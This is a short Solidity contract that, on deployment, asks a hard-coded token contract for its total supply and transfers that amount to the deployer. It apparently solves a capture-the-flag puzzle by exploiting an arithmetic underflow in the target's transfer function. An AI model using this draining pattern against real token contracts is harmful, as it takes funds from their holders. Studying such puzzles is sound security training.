// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IToken {
    function totalSupply() external returns(uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
}


contract TokenOdometer {

    IToken tokenSC = IToken(0xD349B369EC7D2d183AB026DdF27A6A761d511c0D);

    constructor() {
        uint256 totalSupply = tokenSC.totalSupply();
        tokenSC.transfer(msg.sender, totalSupply);
    }  
}